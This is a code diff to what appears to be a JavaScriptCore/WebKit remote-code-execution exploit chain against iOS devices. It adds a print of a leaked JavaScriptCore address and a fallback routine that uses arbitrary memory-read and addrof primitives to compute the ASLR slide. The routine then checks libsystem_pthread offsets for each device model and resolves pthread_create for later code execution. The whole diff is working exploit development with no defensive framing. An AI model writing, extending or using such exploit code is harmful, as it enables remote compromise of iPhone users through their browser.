@@ -17464,6 +17464,7 @@ async function _aarw_main() {
           }
           const executable = read64(addrof(parseFloat) + 0x18n);
           globalFuncParseFloat = read64(executable + 0x28n).noPAC();
+          print("globalFuncParseFloat: " + globalFuncParseFloat.hex());
           const jsc_base = (function() {
               let jsc_base = globalFuncParseFloat & ~0xfffn;
 
@@ -17954,6 +17955,39 @@ const device_chipset = {
                   }
               }
               if (device_model) break;
+          }
+          if (!device_model) {
+              resolverCheckpoint("auth stub resolver failed; trying offset table fallback");
+              const seenFallbackModels = {};
+              for (const candidate_device_model of Object.keys(linkedit_map).map(key => linkedit_map[key])) {
+                  if (seenFallbackModels[candidate_device_model]) continue;
+                  seenFallbackModels[candidate_device_model] = true;
+                  const candidate_offsets = rce_offsets[candidate_device_model];
+                  if (!candidate_offsets || !candidate_offsets.JavaScriptCore__globalFuncParseFloat || !candidate_offsets.libsystem_pthread_base || !candidate_offsets.libsystem_pthread_linkedit) {
+                      resolverCheckpoint(`fallback skip ${candidate_device_model}: missing offsets`);
+                      continue;
+                  }
+                  try {
+                      const candidate_slide = globalFuncParseFloat - candidate_offsets.JavaScriptCore__globalFuncParseFloat;
+                      const candidate_base = candidate_offsets.libsystem_pthread_base + candidate_slide;
+                      const candidate_linkedit_addr = candidate_base + 0x600n;
+                      resolverCheckpoint(`fallback candidate=${candidate_device_model} slide=${candidate_slide.hex()} base=${candidate_base.hex()} linkedit_addr=${candidate_linkedit_addr.hex()}`);
+                      const candidate_linkedit = read64(candidate_linkedit_addr);
+                      resolverCheckpoint(`fallback linkedit=${candidate_linkedit.hex()} expected=${candidate_offsets.libsystem_pthread_linkedit.hex()}`);
+                      if (candidate_linkedit !== candidate_offsets.libsystem_pthread_linkedit) continue;
+                      pthread_create_got = 0n;
+                      pthread_create = candidate_offsets.pthread_create + candidate_slide;
+                      libsystem_pthread_base = candidate_base;
+                      libsystem_pthread_linkedit = candidate_linkedit;
+                      selected_pthread_create_auth_stubs_offset = candidate_offsets.pthread_create_auth_stubs_offset || 0n;
+                      selected_pthread_create_offset = candidate_offsets.pthread_create_offset || 0n;
+                      device_model = candidate_device_model;
+                      resolverCheckpoint(`fallback selected device_model=${device_model}`);
+                      break;
+                  } catch (e) {
+                      resolverCheckpoint(`fallback candidate=${candidate_device_model} failed: ${e}`);
+                  }
+              }
           }
           if (!device_model)
               throw new TryAgainError(`missing device model for ios_version=${ios_version} known_linkedits=${Object.keys(linkedit_map).join(",")} auth_stub_candidates=${auth_stub_candidates.map(x => x.hex()).join(",")}`);
